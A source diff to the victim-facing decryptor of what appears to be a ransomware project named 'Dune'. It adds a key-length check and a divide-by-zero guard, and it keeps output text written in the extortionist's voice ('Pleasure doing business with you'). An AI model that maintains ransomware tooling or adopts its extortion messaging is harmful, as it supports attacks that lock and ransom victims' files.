@@ -92,8 +92,14 @@ static void decrypt_files(std::string enc_key, std::string user_home)
     done_msg += "Total files seen on system to process for decryption: " + std::to_string(totalFilesOnSystem) + "\n";
     done_msg += "Total files processed that are not encrypted with Dune: " + std::to_string(totalNonDuneFiles) + "\n";
     done_msg += "Total files decrypted with decryptor: " + std::to_string(filesDecrypted) + "\n";
-    done_msg += "Decryptor success rate (decryped / (total_files - non_dune_files)): " + std::to_string((filesDecrypted / (totalFilesOnSystem - totalNonDuneFiles)) * 100) + " %\n\n";
-    done_msg += "You can now safly delete any ransomware files. Unless there were problems decrypting.";
+    int result;
+    if ((totalFilesOnSystem - totalNonDuneFiles) != 0) {
+        result = (filesDecrypted / (totalFilesOnSystem - totalNonDuneFiles)) * 100;
+    } else {
+        result = 0;
+    }
+    done_msg += "Decryptor success rate (decryped / (total_files - non_dune_files)): " + std::to_string(result) + " %\n\n";
+    done_msg += "You can now safly delete any ransomware files. Unless there were problems decrypting.\n";
     done_msg += "This encryption software is guaranteed to work. Only if you entered the right key. If you did not then all of your files are corrupted and we cant help you.\n";
     done_msg += "Pleasure doing business with you\n\n";
     finish.write(done_msg.c_str(), done_msg.length());
@@ -135,7 +141,11 @@ int main(int argc, char *argv[])
         printf("Specify key in hex format with the --key flag.\n.Example: ./decryptor --key 8bed8ad73fee0051896448fa3c1a488327cde3d167047b85a98ad18f755c229f\n\nMake sure to substitute your key.\n");
         return -1;
     }
-    std::string decoded_key = std::string(HexToBytes(enc_key).data(), 32);
+    if (HexToBytes(enc_key).size() != 32) {
+        printf("WARNING: Invalid key. Careful. Key must be 256 bits or 32 Bytes or 64 hex chars.");
+        return -1;
+    }
+    std::string decoded_key = std::string(HexToBytes(enc_key).data(),32);
     decrypt_files(decoded_key, "./");
     printf("Done.\nRead the finish.txt file for results. Location: ./finish.txt\n");
 }
